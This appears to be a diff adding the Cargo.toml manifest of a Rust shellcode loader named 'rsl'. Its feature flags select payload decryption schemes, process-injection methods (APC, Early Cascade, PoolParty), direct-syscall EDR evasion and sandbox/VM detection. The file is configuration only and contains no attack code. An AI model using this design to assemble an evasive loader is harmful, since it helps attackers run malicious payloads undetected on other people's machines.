@@ -1,0 +1,135 @@
+cargo-features = ["trim-paths", "panic-immediate-abort"]
+
+[workspace]
+members = ["rsl-macros"]
+
+[package]
+name = "rsl"
+version = "1.1.1"
+edition = "2021"
+
+[dependencies]
+tempfile = "3.10.1"
+base64 = "0.21.5"
+base32 = "0.5.1"
+windows = { version = "0.51.1", features = ["Win32_Foundation", "Win32_System_Threading", "Win32_System_LibraryLoader", "Win32_Networking_WinHttp"] }
+winreg = "0.52.0"
+uuid = { version = "1.0", features = ["v4"] }
+memmap2 = "0.6.1"
+dirs = "4.0"
+sha2 = "0.10"
+obfstr = "0.4"
+aes = "0.8"
+chacha20 = "0.8"
+generic-array = "0.14"
+serde = { version = "1.0", features = ["derive"] }
+wmi = "0.9"
+aes-gcm = "0.10"
+rc4 = "0.1"
+typenum = "1.16"
+cipher = "0.4"
+cbc = "0.1"
+ascon-aead = "0.4.2"
+sm4 = "0.5"
+ctr = "0.9"
+chacha20poly1305 = "0.10"
+hex = "0.4"
+p256 = { version = "0.13", features = ["ecdh"] }
+elliptic-curve = { version = "0.13", features = ["ecdh"] }
+hkdf = "0.12"
+rand = "0.8"
+colored = "2.0"
+cryptify = "3.1.1"
+rsl-macros = { path = "rsl-macros" }
+proc-macro2 = "1.0"
+quote = "1.0"
+syn = { version = "2.0", features = ["full"] }
+sysinfo = "0.29"
+ntapi = "0.4.0"
+
+[dependencies.windows-sys]
+version = "0.52"
+features = [
+    "Win32_Foundation",
+    "Win32_Security",
+    "Win32_System_Threading",
+    "Win32_UI_WindowsAndMessaging",
+    "Win32_System_Memory",
+    "Win32_System_Diagnostics_Debug",
+    "Win32_System_SystemServices",
+    "Win32_System_WindowsProgramming",
+    "Win32_System_LibraryLoader",
+    "Win32_System_SystemInformation",
+    "Win32_System_Kernel",
+]
+
+[build-dependencies]
+embed-resource = "1.8.0"
+base64 = "0.21.5"
+
+[features]
+default = ["decrypt_ipv4", "alloc_mem_nt_allocate_virtual_memory", "run_nt_create_thread_ex", "none_decode", "load_payload_read_file", "hells_halos_tartarus_gate"]
+
+debug = []
+
+# Payload Loading Modes
+load_payload_read_file = []
+load_payload_separate = []
+
+# 解密算法特性开关
+none_decode = []
+base64_decode = []
+urlsafe_base64_decode = []
+base32_decode = []
+hex_decode = []
+decrypt_rc4 = []                # 启用RC4解密
+decrypt_ipv4 = []               # 启用IPv4解密
+decrypt_ipv6 = []               # 启用IPv6解密
+decrypt_mac = []                  # 启用MAC解密
+decrypt_uuid = []               # 启用UUID解密
+decrypt_aes = []                # 启用AES解密
+decrypt_xchacha20 = []          # 启用XChaCha20-Poly1305解密
+decrypt_ecc = []                # 启用ECC解密
+
+# 内存分配方式
+alloc_mem_nt_allocate_virtual_memory = []
+alloc_mem_nt_map_view_of_section = []
+
+# 注入/执行方式
+pattern1 = []
+pattern2 = []
+pattern3 = []
+run_nt_create_thread_ex = ["pattern1"]          # CreateThread注入
+run_apc_syscall = ["pattern1"]               # APC注入
+run_hook_bypass = ["pattern1"]                        # Hook Bypass (KiUserExceptionDispatcherStepOver)
+run_early_exception_inject = ["pattern2"]                       # KiUserExceptionDispatcherInjection
+run_early_cascade = ["pattern2"]                                # Early Cascade Injection
+run_entry_point_injection = ["pattern2"]                        # Entry Point Injection (EPI)
+run_pool_party = ["pattern2"]                                   # PoolParty Injection (TP_DIRECT)
+
+
+with_forgery = []               # 启用伪造特性
+
+# syscall
+freshycalls_syswhispers = []
+hells_halos_tartarus_gate = []
+hw_syscall = []
+
+# 虚拟机/沙箱检测特性
+sandbox = []
+vm_check_prime = ["sandbox"]
+vm_check_rdtsc_timing = ["sandbox"]
+vm_check_edge = ["sandbox"]
+vm_check_ip = ["sandbox"]
+
+win7 = []
+
+[profile.release]
+opt-level = 3
+lto = true
+codegen-units = 1
+strip = true
+debug = false
+split-debuginfo = "off"
+panic = "immediate-abort"
+trim-paths = "all"
